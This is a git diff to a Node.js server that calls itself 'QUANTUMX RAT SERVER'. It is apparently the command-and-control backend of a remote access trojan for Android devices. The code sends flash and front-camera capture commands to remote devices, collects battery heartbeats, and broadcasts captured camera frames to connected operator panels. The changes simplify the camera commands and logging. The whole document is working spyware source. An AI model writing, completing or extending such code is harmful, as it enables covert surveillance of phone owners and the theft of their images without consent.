@@ -142,23 +142,11 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     
     const deviceName = devices.get(deviceId)?.deviceName || deviceId;
     
-    // Log berdasarkan tipe command
+    // LOG PERTAMA: PROSES
     if (command === 'flash') {
-        console.log(`📸 [FLASH] SENT -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
-    } else if (command === 'camera_start') {
-        console.log(`📷 [CAMERA] START REQUEST -> ${deviceName} (${deviceId})`);
-        
-        // Catat session camera
-        cameraSessions.set(deviceId, { active: true, timestamp: Date.now() });
-        
-    } else if (command === 'camera_stop') {
-        console.log(`📷 [CAMERA] STOP REQUEST -> ${deviceName} (${deviceId})`);
-        
-        // Hapus session camera
-        cameraSessions.delete(deviceId);
-        
-    } else if (command === 'camera_frame') {
-        console.log(`📷 [CAMERA] FRAME REQUEST -> ${deviceName} (${deviceId})`);
+        console.log(`📸 [FLASH] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
+    } else if (command === 'camera') {
+        console.log(`📷 [CAMERA] CAPTURING -> ${deviceName} (${deviceId})`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -189,20 +177,19 @@ app.post('/api/device/command/result', (req, res) => {
         
         const deviceName = devices.get(deviceId)?.deviceName || deviceId;
         
+        // LOG KEDUA: HASIL
         if (deviceCommands[commandIndex].command === 'flash') {
             if (status === 'completed') {
                 console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
             } else {
                 console.log(`❌ [FLASH] FAILED -> ${deviceName}`);
             }
-        } else if (deviceCommands[commandIndex].command === 'camera_start') {
+        } else if (deviceCommands[commandIndex].command === 'camera') {
             if (status === 'completed') {
-                console.log(`✅ [CAMERA] STARTED -> ${deviceName}`);
+                console.log(`✅ [CAMERA] SUCCESS -> ${deviceName} | PHOTO TAKEN`);
             } else {
-                console.log(`❌ [CAMERA] START FAILED -> ${deviceName}`);
+                console.log(`❌ [CAMERA] FAILED -> ${deviceName}`);
             }
-        } else if (deviceCommands[commandIndex].command === 'camera_stop') {
-            console.log(`✅ [CAMERA] STOPPED -> ${deviceName}`);
         }
     }
     
@@ -292,7 +279,10 @@ io.on('connection', (socket) => {
             timestamp: new Date().toISOString()
         });
         
-        console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
+        // Log heartbeat (1% chance)
+        if (Math.random() < 0.01) {
+            console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
+        }
     });
     
     // ===== CAMERA FRAME DARI APK =====
@@ -309,15 +299,15 @@ io.on('connection', (socket) => {
             devices.set(deviceId, device);
         }
         
-        // Kirim frame ke semua panel yang sedang memantau device ini
-        // atau broadcast ke semua panel (bisa difilter nanti)
+        // Kirim frame ke semua panel
         io.emit('camera-frame', {
             deviceId,
             imageData,
             timestamp: timestamp || Date.now()
         });
         
-        console.log(`📸 [CAMERA FRAME] RECEIVED from ${deviceId} (${imageData ? imageData.length : 0} bytes)`);
+        // Frame received (ini bagian dari proses camera, tapi ga perlu log terpisah)
+        // Karena sudah ada log SUCCESS dari command-result
     });
     
     // ===== PANEL CONNECT =====
@@ -357,18 +347,6 @@ io.on('connection', (socket) => {
     });
 });
 
-// ========== CAMERA STATUS ENDPOINT ==========
-app.get('/api/camera/status/:deviceId', authenticateToken, (req, res) => {
-    const deviceId = req.params.deviceId;
-    const isActive = cameraSessions.has(deviceId);
-    
-    res.json({
-        deviceId,
-        cameraActive: isActive,
-        lastFrame: isActive ? cameraSessions.get(deviceId).timestamp : null
-    });
-});
-
 // ========== STATS ==========
 app.get('/api/stats', authenticateToken, (req, res) => {
     const deviceList = Array.from(devices.values());
@@ -390,33 +368,22 @@ app.get('/api/stats', authenticateToken, (req, res) => {
     });
 });
 
-// Cleanup inactive camera sessions (setiap 5 menit)
-setInterval(() => {
-    const now = Date.now();
-    cameraSessions.forEach((session, deviceId) => {
-        // Hapus session yang sudah lebih dari 1 menit tidak ada aktivitas
-        if (now - session.timestamp > 60000) {
-            cameraSessions.delete(deviceId);
-            console.log(`🧹 [CLEANUP] Camera session expired: ${deviceId}`);
-        }
-    });
-}, 60000);
-
 // ========== START ==========
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔═══════════════════════════════════════════════════╗
-║    QUANTUMX RAT SERVER v3.0                       ║
+║    QUANTUMX RAT SERVER v3.1                       ║
 ║    RUNNING ON PORT: ${PORT}                                    ║
 ║    WEBSOCKET: ws://localhost:${PORT}                           ║
 ║    API: http://localhost:${PORT}/api                          ║
 ║                                                     ║
-║    FEATURES:                                        ║
-║    • Flash Control ✅                               ║
-║    • Front Camera Screenshot ✅                     ║
-║    • Real-time Camera Frames ✅                     ║
-║    • WebSocket with auto-reconnect ✅               ║
+║    LOG FORMAT:                                       ║
+║    📸 [FLASH] SENDING -> Device (2s)                ║
+║    ✅ [FLASH] SUCCESS -> Device | DURATION: 2s      ║
+║    📷 [CAMERA] CAPTURING -> Device                   ║
+║    ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN       ║
+║    💓 [HEARTBEAT] Device - 82% (1% chance)          ║
 ╚═══════════════════════════════════════════════════╝
     `);
 });
